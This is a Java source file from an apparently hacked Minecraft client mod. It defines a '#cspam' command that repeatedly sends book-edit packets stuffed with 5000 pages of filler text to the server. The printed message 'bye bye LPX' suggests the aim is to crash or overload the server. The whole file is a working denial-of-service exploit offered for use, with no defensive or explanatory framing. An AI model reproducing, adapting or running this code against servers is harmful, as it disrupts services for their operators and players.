package com.moonclient.pro.Command.impl;

import com.moonclient.pro.Command.Command;
import java.util.ArrayList;
import java.util.Optional;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.inventory.AbstractContainerMenu;
import net.minecraft.network.chat.Component;
import net.minecraft.network.protocol.game.ServerboundEditBookPacket;
import net.minecraft.client.Minecraft;
import net.minecraft.client.player.LocalPlayer;

@Environment(value=EnvType.CLIENT)
public class cspam
implements Command {
    private final int EXECUTION_DURATION_SECONDS = 10;

    @Override
    public void execute(String[] args) {
        if (args.length != 3) {
            Minecraft.getInstance().player.sendSystemMessage(Component.literal("§b[§9lodias§b] §cUsage: " + this.getUsage()), false);
            return;
        }
        try {
            final int totalPackets = Integer.parseInt(args[1]);
            final int delay = Integer.parseInt(args[2]);
            Player player =  Minecraft.getInstance().player;
            if (player == null) {
                System.out.println("Player is null");
                return;
            }
            AbstractContainerMenu handler = ((Player)player).containerMenu;
            if (handler == null) {
                System.out.println("ScreenHandler is null");
                return;
            }
            final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
            Runnable task = new Runnable(){
                private long endTime = System.currentTimeMillis() + 10000L;
                private int packetsSent = 0;

                @Override
                public void run() {
                    if (System.currentTimeMillis() >= this.endTime || this.packetsSent >= totalPackets) {
                        scheduler.shutdown();
                        return;
                    }
                    ExecutorService executor = Executors.newSingleThreadExecutor();
                    executor.submit(() -> {
                        String title = "Funny book{:";
                        String mm255 = "asdfafghkjhudafgzhdijfgsdjikfgsdioujfjsiofjiosdfijofdsjio";
                        ArrayList<String> pages = new ArrayList<String>(10000);
                        String pageContent = mm255;
                        for (int i = 0; i < 5000; ++i) {
                            pages.add(pageContent);
                        }
                        for (int n = 0; n < totalPackets; ++n) {
                            Minecraft.getInstance().getConnection().send(new ServerboundEditBookPacket(Minecraft.getInstance().player.getInventory().selected, pages, Optional.of(title)));
                        }
                        Minecraft.getInstance().player.sendSystemMessage(Component.literal("§7[§3Lodias§7] §abye bye LPX §7Power: §3" + totalPackets));
                    });
                    executor.shutdown();
                    ++this.packetsSent;
                    scheduler.schedule(this, (long)delay, TimeUnit.MILLISECONDS);
                }
            };
            scheduler.schedule(task, (long)delay, TimeUnit.MILLISECONDS);
        }
        catch (NumberFormatException e) {
            Minecraft.getInstance().player.sendSystemMessage(Component.literal("§b[§9lodias§b] §7Invalid number format"), false);
            System.out.println("Invalid number format: " + args[1] + " or " + args[2]);
        }
    }

    @Override
    public String getUsage() {
        return "#cspam <packets> <delay>";
    }
}
 